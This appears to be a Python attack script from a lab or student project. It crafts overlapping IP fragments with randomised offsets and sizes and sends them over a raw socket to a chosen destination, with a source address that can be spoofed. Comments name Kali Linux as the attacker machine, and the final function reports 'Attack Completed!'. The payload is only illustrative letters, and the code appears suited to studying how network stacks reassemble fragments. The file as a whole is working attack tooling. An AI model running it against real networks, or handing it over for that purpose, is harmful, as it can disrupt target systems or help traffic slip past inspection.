#Attack Parameter Function 

#Import Libraries:
import socket
import random
import sys
from math import ceil

#Import Functions:
from helper_functs.attackParamClass import attackParamClass
from helper_functs.rawsocket import rawSockGen
from helper_functs.ipFormCheck import ipFormCheck
from helper_functs.ipHeadFieldGen import ipHeadFieldGen

def simpleOverlapAttackParam(srcIP, dstIP):

    #Check if IP address have correct form:
    isSrcIpValid=ipFormCheck(srcIP)
    isDestIpValid=ipFormCheck(dstIP)

    if (isSrcIpValid==False)or(isDestIpValid==False):
        if (isSrcIpValid==False)and(isDestIpValid==False):
            print("Error: Both Source and Destination IP addresses have the wrong form. Please enter them and try again!") 
        elif (isSrcIpValid==False):
           print("Error: Source IP address has the wrong form. Please enter it and try again!") 
        else:
            print("Error: Destination IP address has the wrong form. Please enter it and try again!")

        sys.exit(1) 


    #Generate a random Identification Field for the IP packet:
    IDField=random.randint(0, 65535)

    #Define the Time-to-Live (TTL) field and protocol in use:
    TTL=64 #set to 64 to match the default TTL in Kali Linux (attacker machine)
    protoField=socket.IPPROTO_UDP #set to UDP for connectionless sending


    #Define fragment size (for all normal fragments):
    fragSize=32

    #Define the offset at which the overlapping fragment starts:
    overlapOffset=random.randrange(8,fragSize-8+1,8) # The value is randomly selected from an inclusive range. It is from from 8 
                                                     # (to ensure that the the offset doesn't start at byte 0 and fully replace the previous fragment) 
                                                     # and fragSize-8 (to ensure the at least 8 bytes remain before the previous fragment ends). This is done in steps 
                                                     # of 8 (to match IP header 8 byte fragment offset requirement).

    #Calculate the maximum size of the overlap (i.e. remaining bytes in previous fragment): 
    maxOverlapSize=fragSize-overlapOffset 

    #Define the overlapped fragment size:
    overlapSize=random.randint(4,maxOverlapSize) #Its size is a randomly chosen integer between 4 (design choice) and the maximum overlap size.

    #Define a random amount of fragment packets to send:
    totalNumFrags=random.randint(3,6) #The value is randomly selected from the (inclusive) range: [3,6] (design choice)

    #Define at which fragment index does overlap happen:
    overlapInd=random.randint(1,totalNumFrags-1) #The index 1 represents the 1st fragment, 2 the 2nd fragment, etc.
                                                #This index value cannot be 0 and totalNumFrags as these have no fragments before and after them, repectively.

    #Define an array that stores all generated fragments (specifically their size, offset, and paylaod):
    allFragms=[]

    #Offset Counter:
    currOffset=0

    #Build each fragment and store it in fragments list:
    for i in range(totalNumFrags):
        if (i==overlapInd):#Overlapping Fragment
            overlapFragOffset=allFragms[i-1]["fragOffset"]+overlapOffset #Shifted back to the previous fragments range so both fragments (the previous normal and now overlapping) have overlapping bytes
            overlapFragSize=overlapSize+maxOverlapSize#Its size is covers the remaining previous nomal fragment and an extra amount (non-overlapping)

            if (i != (totalNumFrags-1)): #to guarantee that overlapping fragments size is a multiple of 8 so that we don't unintentionally corrupt the next fragment too when we shift right by 3 (i.e. divide by 8) in the 'ipHeadFieldGen' function
                overlapFragSize=ceil(overlapFragSize/8)*8 # round up to the closest multiple of 8 
                # else do nothing; since its the last fragment and its size doesn't need to be a multiple of 8

        else: #Otherwise normal fragment
            overlapFragOffset=currOffset#offset is set to currentoffset counter which is defined later as just the previous offset (normal) + the normal fragment size (i.e. 32)
            overlapFragSize=fragSize#its size is just the normal fragment's size (i.e. 32)

        currOffset=overlapFragOffset+overlapFragSize #Update counter to the last offset + the size of the fragment (normal or overlapping)

        fragPayload=bytes([i+65])*overlapFragSize #set the payload of the fragment. Just repeating letters per each fragment (for illustrative purposes)

        #Save all fragments (their size, starting offset, and payload) to a list for use later.
        allFragms.append({
        "fragSize":overlapFragSize,
        "fragOffset":overlapFragOffset, 
        "fragPayload":fragPayload
        })

    # Return all needed parameters as a class for easy access later in main attacker code:
    return attackParamClass(srcIP,dstIP,IDField,TTL,protoField,fragSize,allFragms)


def simpleOverlapAttack(attackParams):
    rawSock=rawSockGen();

    for i in range(len(attackParams.allFragms)): #For each fragment, build the IP header add the pre-built payload and send it to the target destination address
        frag=attackParams.allFragms[i]

        if (i==(len(attackParams.allFragms)-1)):
            isLastFrag=True
        else:
            isLastFrag=False

        ipHeadPacket=ipHeadFieldGen(attackParams.srcIPAddr,attackParams.destIPAddr,attackParams.IDField,attackParams.TTL,attackParams.protoField,frag["fragSize"],frag["fragOffset"],isLastFrag)

        ipPacket=ipHeadPacket + frag["fragPayload"]
        rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))
        print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")

    print(f"=> Fragments sent with ID={attackParams.IDField}. Attack Completed!") 
